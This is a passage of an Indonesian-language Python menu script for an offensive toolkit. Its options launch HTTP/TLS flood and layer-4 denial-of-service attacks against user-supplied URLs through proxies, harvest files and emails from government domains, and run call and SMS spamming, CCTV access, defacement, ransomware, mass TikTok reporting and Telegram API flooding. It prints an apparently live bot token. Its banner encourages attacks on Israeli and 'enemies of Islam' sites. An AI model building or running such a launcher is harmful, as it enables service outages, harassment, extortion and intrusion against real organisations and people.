 \033[1;34m██\033[1;31m║      \033[1;34m███████\033[1;31m║  ╚\033[1;34m████\033[1;31m╔╝  \033[1;34m█████\033[1;31m╗   \033[1;34m██████\033[1;31m╔╝        \033[1;34m██\033[1;31m╔╝
 \033[1;34m██\033[1;31m║      \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m║   ╚\033[1;34m██\033[1;31m╔╝   \033[1;34m██\033[1;31m╔══╝   \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗       \033[1;34m██\033[1;31m╔╝
 \033[1;34m███████\033[1;31m╗ \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║    \033[1;34m██\033[1;31m║    \033[1;34m███████\033[1;31m╗ \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║       \033[1;34m██\033[1;31m║
 \033[1;31m╚══════╝ ╚═╝  ╚═╝    ╚═╝    ╚══════╝ ╚═╝  ╚═╝       ╚═╝  
""")
                print('''                       \033[1;31mWARNING!!!
 DIMOHON KESADARANNYA UNTUK TIDAK MENARGETKAN WEB SEKOLAH,
 PEMERINTAH, DAN LAINNYA. KECUALI WEB SLOT, BOK*B, ISRAEL,
 DAN MUSUH-MUSUH ISLAM LAINNYA. KARENA SESUNGGUHNYA TUHAN
          MAHA MELIHAT APA YANG KAMU PERBUAT.
''')
                print(" \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mHTTPv1")
                print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mHTTPv2")
                print(" \033[1;31m[\033[1;37m3\033[1;31m] \033[1;36mHTTPv3")
                print(" \033[1;31m[\033[1;37m4\033[1;31m] \033[1;36mMIX")
                print(" \033[1;31m[\033[1;37m5\033[1;31m] \033[1;36mTLSv1")
                print(" \033[1;31m[\033[1;37m6\033[1;31m] \033[1;36mTLSv2")
                print(" \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mBack To Menu")
                pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMethod \033[1;36m: \033[1;37m")
                if pilihan.endswith("1"):
                    httpv1()
                    #os.system("python3 .data/.l")
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("2"):
                    time.sleep(1)
                    url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        time.sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        time.sleep(0.5)
                        sys.exit()
                    else:
                        os.system(f"python .data/.f {url}")
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("3"):
                        time.sleep(1)
                        httpv3()
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("4"):
                    os.system("cls" if os.name == "nt" else "clear")
                    time.sleep(1)
                    os.system("python3 .data/.m")
                    wait = input("\n\033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("5"):
                    time.sleep(1)
                    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCukup memakan RAM & Disarankan tidak menggunakan android")
                    url = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        time.sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        time.sleep(0.5)
                        sys.exit()
                    else:
                        req = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mRequest/s \033[1;31m(ex. 200) \033[1;36m: \033[0;37m")
                        th = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mThread \033[1;31m(ex. 100) \033[1;36m: \033[0;37m")
                        time = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTime \033[1;31m(ex. 60) \033[1;36m: \033[0;37m")
                        os.system(f"node .j {url} {time} {req} {th} proxy1.txt")
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                elif pilihan.endswith("6"):
                    time.sleep(1)
                    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCukup memakan RAM & Disarankan tidak menggunakan android")
                    url = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        time.sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        time.sleep(0.5)
                        sys.exit()
                    else:
                        req = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mRequest/s \033[1;31m(ex. 200) \033[1;36m: \033[0;37m")
                        th = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mThread \033[1;31m(ex. 100) \033[1;36m: \033[0;37m")
                        time = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTime \033[1;31m(ex. 60) \033[1;36m: \033[0;37m")
                        os.system(f"node .k {url} {time} {req} {th} proxy.txt")
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                else:
                    time.sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "2" or message == "02":
                time.sleep(1)
                #os.system("cls" if os.name == "nt" else "clear")
                layer4()
                sys.exit()
                #wait = input("\n\033[1;33mPress Enter to continue")
                #os.system("cls" if os.name == "nt" else "clear")
                #logo()
            elif message == "3" or message == "03":
                time.sleep(1)
                print("\033[1;31mTutorial :")
                print("1. Tekan Launch, kalo gak bisa daftar dulu")
                print("2. Tekan garis 3 pojok kiri atas")
                print("3. Tekan terminal lalu pilih new terminal")
                if os.name == "posix":
                    os.system("xdg-open https://onecompiler.com/studio/jupyter-notebook")
                elif os.name == "nt":
                    os.system("start https://onecompiler.com/studio/jupyter-notebook")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "4" or message == "04":
                time.sleep(1)
                print("\033[1;31mTips :")
                print("1. Tekan enter lalu tunggu beberapa detik")
                print("2. Jika ingin menjalankan script yg sama, silakan copy\n   perintah dibawah ini!")
                print("\n\033[0;37mgit clone https://github.com/ShadowXploit/dark-x\ncd dark-x\nbash module.sh\npython bot.py")
                print("\n\033[1;31mJika tdk, silakan copy command dari sumber github masing²")
                if os.name == "posix":
                    os.system("xdg-open https://shell.segfault.net/#/dashboard")
                elif os.name == "nt":
                    os.system("start https://shell.segfault.net/#/dashboard")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "5" or message == "05":
                time.sleep(1)
                target = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mDomain Target \033[1;31m(ex. kpu.go.id) \033[1;36m: \033[0;37m")
                filetype = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mFiletype \033[1;31m(ex. pdf,xlsx,docx,csv/all) \033[1;36m: \033[0;37m")
                page = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJumlah Halaman \033[1;31m(ex. 3) \033[1;36m: \033[0;37m")
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                os.system(f"bash .data/.h -t {target} -e {filetype} -p {page}")
                print("")
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "6" or message == "06":
                time.sleep(1)
                url = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL Target \033[1;31m(ex. https://kpu.go.id) \033[1;36m: \033[0;37m")
                limit = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJumlah Pencarian \033[1;31m(ex. 3) \033[1;36m: \033[0;37m")
                time.sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                os.system(f"python .data/.e -d {url} -b {limit}")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "7" or message == "07":
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                ig()
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "8" or message == "08":
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                ip_track()
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "9" or message == "09":
                time.sleep(1)
                #Tambahkan kalo mau pake server openai
                #print("\033[1;34mNote \033[1;31m: \033[0;37mJika API Key expired, \nBuatlah API Key di \033[1;31mhttps://platform.openai.com/api-keys\n\033[0;37mKalo ga bisa login dulu, baru akses lagi link nya.")
                os.system("cls" if os.name == "nt" else "clear")
                shadow_gpt()
                #os.system("python3 .data/.q")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "10":
                time.sleep(1)
                print("\n \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mUbah Tampilan Termux")
                print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mReset Tampilan Termux")
                print(" \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mBack To Menu")
                pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;31m: \033[1;37m")
                if pilihan.endswith("1"):
                    time.sleep(1)
                    termux_banner()
                    #os.system("python .data/.d")
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("2"):
                    time.sleep(1)
                    os.system("cp .data/.sh1 $HOME/../usr/etc/bash.bashrc")
                    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mSelesai")
                    time.sleep(0.5)
                    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKetik \033[1;31mlogin \033[1;34muntuk mencoba!")
                    wait = input("\n \033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    #print("\033[1;31mInvalid options...!!!")
                    time.sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "11":
                time.sleep(1)
                #os.system("cls" if os.name == "nt" else "clear")
                os.system("python2 .data/.b")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "12":
                print(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mPlease wait...")
                os.system("python3 .data/.s")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "13":
                print(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mPlease wait...")
                os.system("python3 .data/.r")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "14":
                time.sleep(1)
                spam_call()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "15":
                time.sleep(1)
                print("\n\033[1;31mTips :")
                print("1. Regisrasi pake nomor target\n2. Isi captcha\n3. Klik daftar\n4. Selesai")
                if os.name == "posix":
                    os.system("xdg-open https://www.traveloka.com/id-id/user/signin")
                elif os.name == "nt":
                    os.system("start https://www.traveloka.com/id-id/user/signin")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "16":
                time.sleep(1)
                os.system("python3 .data/.x")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "17":
                def replace_text_in_first_line(input_file, output_file, new_text):
                    with open(input_file, 'r') as file:
                        lines = file.readlines()
                    lines[0] = new_text + '\n'
                    with open(output_file, 'w') as file:
                        file.writelines(lines)
                input_file = 'urls.txt'
                output_file = 'urls.txt'
                time.sleep(1)
                print("\033[1;34mNote \033[1;31m: \033[0;37mJika anda menerima virus berbentuk undangan apk atau\nsejenisnya, silakan bongkar & lihat sourcenya lalu copy API\ntelegram si penipu dari apk nya untuk di spam hingga down.\nDan selamat, anda telah menyelamatkan banyak orang:)")
                time.sleep(0.3)
                print("\n\033[1;34mContoh API telegram \033[1;31m: \033[0;37mhttps://api.telegram.org/bot6857276354:AAH98ElI1j81M3c3KlcxoqIMzTX6H_EAIFA/sendMessage?parse_mode=markdown&chat_id=6310342995&text=MAU NIPU DEK\n\033[1;31m(MAU NIPU DEK) di ganti isi pesan spam")
                time.sleep(0.3)
                new_text = input("\n\033[1;34mMasukkan API target \033[1;31m: \033[0;37m")
                replace_text_in_first_line(input_file, output_file, new_text)
                os.system("node .a")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "18":
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                cctv()
                #os.system("python3 .data/.c")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "19":
                os.system("cls" if os.name == "nt" else "clear")
                cctv2()
                #os.system("python3 .data/.g")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "20":
                time.sleep(1)
                if os.name == "posix":
                    os.system("xdg-open https://script-deface-generator.prinsh.com/")
                elif os.name == "nt":
                    os.system("start https://script-deface-generator.prinsh.com/")
                time.sleep(2)
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "21":
                time.sleep(1)
                ransomware()
                #os.system("python3 .data/.x")
                wait = input("\n \033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "22":
                time.sleep(1)
                if os.name == "posix":
                    os.system("xdg-open https://jnckmedia.com/nulis/")
                elif os.name == "nt":
                    os.system("start https://jnckmedia.com/nulis/")
                time.sleep(2)
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "23":
                time.sleep(1)
                report_tiktok()
                #os.system("python3 .data/.i")
                wait = input("\n \033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "24":
                time.sleep(1)
                os.system("python3 .data/.n")
                #wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "25":
                time.sleep(1)
                fake_email()
                #os.system("python3 .data/.p")
                wait = input(" \033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            #elif message == "23":
                #os.system("bash update.sh")
            elif message == "LOGIN" or message == "login" or message == "Login":
                os.system("bash")
            else:
                print("\033[1;31mInvalid options...!!!")
                time.sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                logo()
    except KeyboardInterrupt:
        print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mProgram dihentikan")
        time.sleep(1)
        print()
        break